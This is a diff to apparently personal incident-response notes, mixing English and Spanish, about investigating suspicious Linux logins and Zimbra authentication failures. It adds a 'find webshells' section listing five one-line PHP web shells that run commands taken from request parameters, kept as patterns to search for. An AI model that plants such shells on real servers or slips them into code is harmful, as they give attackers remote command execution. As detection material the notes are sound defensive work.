@@ -1,3 +1,4 @@
+---------------------------------------------------------------------------------------------
 Investigate Suspicious Linux Logins
 -aureport
 -less /var/log/secure | grep "authentication"
@@ -262,3 +263,16 @@ Ver problemas de autentificación credenciales
 
 grep "authentication failed for" /opt/zimbra/log/audit.log
 Ver problemas de cuentas y password
+
+----------------------------------------------------------------------------------------------------
+
+Buscar Webshells
+PHP
+
+<?php system($_GET['cmd']); ?>
+<?php echo exec($_POST['cmd']); ?>
+<?php echo passthru($_GET['cmd']); ?>
+<?php passthru($_REQUEST['cmd']); ?>
+<?php echo system($_REQUEST['shell']): ?>
+
+----------------------------------------------------------------------------------------------------
